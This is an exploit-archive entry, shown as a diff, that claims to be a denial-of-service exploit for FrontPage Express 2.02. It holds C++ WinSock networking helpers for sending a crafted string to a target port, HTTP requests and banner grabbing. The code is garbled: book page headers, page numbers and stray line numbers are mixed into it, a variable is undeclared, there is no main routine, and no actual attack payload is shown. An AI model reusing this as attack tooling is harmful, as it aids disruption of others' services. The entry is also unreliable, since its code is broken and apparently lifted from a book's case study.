@@ -1,0 +1,337 @@
+id: 17475
+date: 02/01/2012
+title: frontpage_express2.02 Denial of Service winsock
+author: TrOoN
+cves: 
+
+# Title :frontpage_express2.02 Denial of Service winsock
+# Author :TrOoN
+# E-mail : SOUrRce-x@live.fr  | www.facebook.com/fysl.fyslm
+# Home : city 617 logts  : Draria . algeria
+# Web Site : www.1337day.com       |
+# platform :  WinDows XP sp 2
+# Type : local exploit /SHELL CODE  /ETc...
+#Download link : http://www.jetelecharge.com/Internet/271.php
+
+# waRn :  frontpage_express2.02 no frontpage
+ ~~
+
+######################################## Begin ##################################
+#include <winsock2.h>
+#pragma comment(lib,"ws2_32.lib")
+#define STRING_MAX 65536
+#define MAX 8388608
+char *junk(char *input, int repeat)
+{
+int maxSize;
+char *junkString = new char[STRING_MAX];
+strcpy(junkString, "");
+
+if( repeat < STRING_MAX && repeat > 0 && strlen(input) != 0
+&& strlen(input) <= (STRING_MAX - 1))
+{
+maxSize = (STRING_MAX - 1)/strlen(input);
+for(int count = 0; count < repeat
+&& count < maxSize; count++)
+{
+strcat(junkString, input);
+}
+}
+else
+{
+23 printf("Invalid Perameters! \n");
+strcpy(junkString,"--FAILURE--");
+ : }
+delete [ ] junkString;
+return (junkString);
+}
+bool is_up(char *targetip, int port)
+{
+WSADATA wsaData;
+WORD wVersionRequested;
+struct hostent target_ptr;
+struct sockaddr_in sock;
+SOCKET MySock;
+wVersionRequested = MAKEWORD(2, 2);
+3if (WSAStartup(wVersionRequested, &wsaData) < 0)
+{
+printf("############ERROR!####################\n");
+printf("Your ws2_32.dll is too old to use this
+application. \n");
+printf("Go to microsofts web site to download the most
+recent \n");
+42 printf("version of ws2_32.dll.
+\n");
+
+Frontpage Denial of Service  WinSock • Case Study 1 145
+WSACleanup();
+return (FALSE);
+}
+MySock = socket(AF_INET, SOCK_STREAM, 0);
+if(MySock==INVALID_SOCKET)
+{
+printf("Socket error!\r\n");
+closesocket(MySock);
+WSACleanup();
+return (FALSE);
+}
+if ((pTarget = gethostbyname(targetip)) == NULL)
+{
+printf("\nResolve of %s failed, please try again.\n",
+targetip);
+
+closesocket(MySock);
+WSACleanup();
+return (FALSE);
+ }
+ memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
+sock.sin_family = AF_INET;
+sock.sin_port = htons((USHORT)port);
+if ( (connect(MySock, (struct sockaddr *)&sock, sizeof (sock) )))
+{
+ closesocket(MySock);
+WSACleanup();
+
+return (FALSE);
+ }
+ else
+{
+closesocket(MySock);
+WSACleanup();
+return (TRUE);
+}
+}
+ bool is_string_in(char *needle, char *haystack)
+ {
+ char *loc = strstr(haystack, needle);
+if( loc != NULL )
+{
+return(TRUE);
+ }
+ else
+{
+return(FALSE);
+ }
+ }
+char *replace_string(char *new_str, char *old_str, char *whole_str)
+ Case Study 1 • Frontpage Denial of Service Utilizing WinSock
+{
+ int len = strlen(old_str);
+char buffer[MAX] = "";
+char *loc = strstr(whole_str, old_str);
+ if(loc != NULL)
+ {
+ strncpy(buffer, whole_str, loc-whole_str );
+strcat(buffer, new_str);
+ strcat(buffer, loc + (strlen(old_str)));
+ strcpy(whole_str, buffer);
+ }
+ return whole_str;
+ }
+ char *send_exploit(char *targetip, int port, char *send_string)
+ {
+ WSADATA wsaData;
+ WORD wVersionRequested;
+ struct hostent target_ptr;
+ struct sockaddr_in sock;
+ SOCKET MySock;
+ wVersionRequested = MAKEWORD(2, 2);
+ if (WSAStartup(wVersionRequested, &wsaData) != 0)
+ {
+ printf("############### ERROR!######################\n");
+ printf("Your ws2_32.dll is too old to use this
+application. \n");
+ printf("Go to Microsoft's web site to download the most
+recent \n");
+ printf("version of ws2_32.dll.
+\n");
+ WSACleanup();
+ exit(1);
+ }
+ MySock = socket(AF_INET, SOCK_STREAM, 0);
+if(MySock==INVALID_SOCKET)
+ {
+ printf("Socket error!\r\n");
+
+ closesocket(MySock);
+WSACleanup();
+ exit(1);
+ }
+if ((pTarget = gethostbyname(targetip)) == NULL)
+ { printf("Resolve of %s failed, please try again.\n",
+targetip);
+
+ closesocket(MySock);
+ WSACleanup();
+ exit(1);
+Frontpage Denial of Service Utilizing WinSock • Case Study 1 147
+ }
+ memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
+ sock.sin_family = AF_INET;
+ sock.sin_port = htons((USHORT)port);
+
+ if ( (connect(MySock, (struct sockaddr *)&sock, sizeof (sock) )))
+ {
+ printf("Couldn't connect to host.\n");
+
+ closesocket(MySock);
+ WSACleanup();
+ exit(1);
+ }
+ char sendfile[STRING_MAX];
+ strcpy(sendfile, send_string);
+ if (send(MySock, sendfile, sizeof(sendfile)-1, 0) == -1)
+ {
+ printf("Error sending Packet\r\n");
+ closesocket(MySock);
+ exit(1);
+ }
+
+ send(MySock, sendfile, sizeof(sendfile)-1, 0);
+ char *recvString = new char[MAX];
+ int nret;
+nret = recv(MySock, recvString, MAX + 1, 0);
+char *output= new char[nret];
+strcpy(output, "");
+if (nret == SOCKET_ERROR)
+ {
+ printf("Attempt to receive data FAILED. \n");
+ }
+ else
+ {
+ strncat(output, recvString, nret);
+ delete [ ] recvString;
+ }
+ closesocket(MySock);
+ WSACleanup();
+ return (output);
+ delete [ ] output;
+ }
+ char *get_http(char *targetip, int port, char *file)
+ {
+ WSADATA wsaData;
+ WORD wVersionRequested;
+ struct hostent target_ptr;
+ struct sockaddr_in sock;
+ SOCKET MySock;
+ Case Study 1 • Frontpage Denial of Service Utilizing WinSock
+
+ wVersionRequested = MAKEWORD(2, 2);
+ if (WSAStartup(wVersionRequested, &wsaData) < 0)
+ {
+ printf("################# ERROR! ###################\n");
+ printf("Your ws2_32.dll is too old to use this
+application. \n");
+ printf("Go to microsofts web site to download the most
+recent \n");
+195 printf("version of ws2_32.dll.
+\n");
+
+ WSACleanup();
+ exit(1);
+ }
+ MySock = socket(AF_INET, SOCK_STREAM, 0);
+ if(MySock==INVALID_SOCKET)
+ {
+ printf("Socket error!\r\n");
+
+ closesocket(MySock);
+ WSACleanup();
+ exit(1);
+ }
+ if ((pTarget = gethostbyname(targetip)) == NULL)
+ {
+ printf("Resolve of %s failed, please try again.\n",
+targetip);
+
+ closesocket(MySock);
+ WSACleanup();
+ exit(1);
+ }
+ memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
+ sock.sin_family = AF_INET;
+ sock.sin_port = htons((USHORT)port);
+
+ if ( (connect(MySock, (struct sockaddr *)&sock, sizeof (sock) )))
+ {
+ printf("Couldn't connect to host.\n");
+
+ closesocket(MySock);
+ WSACleanup();
+ exit(1);
+ }
+ char sendfile[STRING_MAX];
+ strcpy(sendfile, "GET ");
+ strcat(sendfile, file);
+ strcat(sendfile, " HTTP/1.1 \r\n" );
+ strcat(sendfile, "Host: localhost\r\n\r\n");
+Frontpage Denial of Service Utilizing WinSock • Case Study 1 149
+ if (send(MySock, sendfile, sizeof(sendfile)-1, 0) == -1)
+{
+ printf("Error sending Packet\r\n");
+ closesocket(MySock);
+ WSACleanup();
+ exit(1);
+ }
+ send(MySock, sendfile, sizeof(sendfile)-1, 0);
+
+ char *recvString = new char[MAX];
+ int nret;
+ nret = recv(MySock, recvString, MAX + 1, 0);
+
+ char *output= new char[nret];
+ strcpy(output, "");
+ if (nret == SOCKET_ERROR)
+ {
+ printf("Attempt to receive data FAILED. \n");
+ }
+ else
+ {
+strncat(output, recvString, nret);
+ delete [ ] recvString;
+ }
+ closesocket(MySock);
+ WSACleanup();
+ return (output);
+ delete [ ] output;
+ }
+ char *banner_grab(char *targetip, int port)
+{
+ char start_banner[] = "Server:";
+ char end_banner[] = "\n";
+ int start = 0;
+ int end = 0;
+ char* ret_banner = new char[MAX];
+char* buffer = get_http(targetip, port, "/");
+
+int len = strlen(buffer);
+
+ char *pt = strstr(buffer, start_banner );
+
+ if( pt != NULL )
+ {
+ start = pt - buffer;
+ for(int x = start; x < len; x++)
+ {
+ if(_strnicmp( buffer + x, end_banner, 1 ) == 0)
+ {
+ Case Study 1 • Frontpage Denial of Service Utilizing WinSock
+ end = x;
+ x = len;
+ }
+ }
+ strcpy(ret_banner, " ");
+ strncat (ret_banner, buffer + start - 1 , (end - start));
+ }
+ else
+ {
+ strcpy(ret_banner, "EOF");
+ }
+ return (ret_banner);
+ delete [ ] ret_banner;
+ }
+  ################### ENd ########################
+
+
+
+#  0day.today [2023-03-23]  #
